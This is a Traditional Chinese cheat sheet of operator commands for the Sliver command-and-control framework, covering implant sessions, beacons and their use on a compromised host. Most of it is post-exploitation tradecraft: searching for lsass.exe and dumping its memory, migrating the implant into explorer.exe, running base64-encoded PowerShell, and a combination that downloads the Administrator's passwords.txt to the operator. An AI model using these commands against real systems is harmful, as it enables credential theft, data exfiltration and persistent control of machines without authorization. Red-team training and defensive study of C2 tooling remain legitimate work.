# Sliver — Session / Beacon 操作指令

## 進入互動介面

```bash
sessions                          # 列出所有 Sessions
beacons                           # 列出所有 Beacons
use <ID>                          # 進入 Session 或 Beacon（支援 TAB 補全）
sessions --interact <SESSION_ID>  # 指定進入 Session
```

---

## 系統資訊

```bash
info        # Implant 與目標詳細資訊
whoami      # 當前使用者
getuid      # UID
getgid      # GID
getpid      # 當前程序 PID
hostname    # 主機名稱
env         # 環境變數
```

---

## 檔案系統

```bash
pwd                         # 當前目錄
ls [PATH]                   # 列出目錄
cat <FILE>                  # 讀取檔案
cd <PATH>                   # 切換目錄
mkdir <PATH>                # 建立目錄
rm <FILE>                   # 刪除檔案
rm -r <DIR>                 # 刪除目錄
mv <SRC> <DST>              # 移動/重新命名
cp <SRC> <DST>              # 複製

download <REMOTE> [LOCAL]   # 下載檔案到本地
upload <LOCAL> <REMOTE>     # 上傳檔案到目標
```

---

## 網路資訊

```bash
netstat     # 網路連線狀態
ifconfig    # 網路介面資訊
```

---

## 執行指令

```bash
# 開啟互動式 Shell（Session 限定）
shell

# 執行指令（靜默）
execute --exe cmd.exe -- /c whoami

# 執行並取得輸出
execute -o --exe cmd.exe -- /c whoami
execute -o --exe powershell.exe -- -enc <BASE64>
```

---

## 程序操作

```bash
ps                      # 列出所有程序
ps --exe lsass.exe      # 搜尋特定程序名稱
ps --pid <PID>          # 搜尋特定 PID
procdump --pid <PID>    # Dump 程序記憶體
kill --pid <PID>        # 終止程序
migrate --pid <PID>     # 遷移 Implant 到指定程序
```

---

## 截圖 / 監控

```bash
screenshot    # 截取目標螢幕畫面
```

## 登錄檔操作

```bash
registry read  "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName"
registry write "HKCU\\SOFTWARE\\Test" Value Data
registry create "HKCU\\SOFTWARE\\Test"
```

---

## Beacon 特有指令

```bash
tasks                   # 列出待執行任務
tasks fetch             # 取得已完成任務結果
tasks cancel --id <ID>  # 取消任務

sleep 60s               # 設定 Sleep 間隔
sleep 60s/20            # 60 秒 ± 20% Jitter

interactive             # 將 Beacon 暫時轉為互動 Session
```

---

## 常用組合

```bash
# 快速確認權限與系統資訊
whoami && hostname && getuid

# 列出當前目錄並下載感興趣的檔案
ls C:\\Users\\Administrator\\Desktop
download "C:\\Users\\Administrator\\Desktop\\passwords.txt"

# 搜尋並遷移到穩定程序
ps --exe explorer.exe
migrate --pid <PID>
```
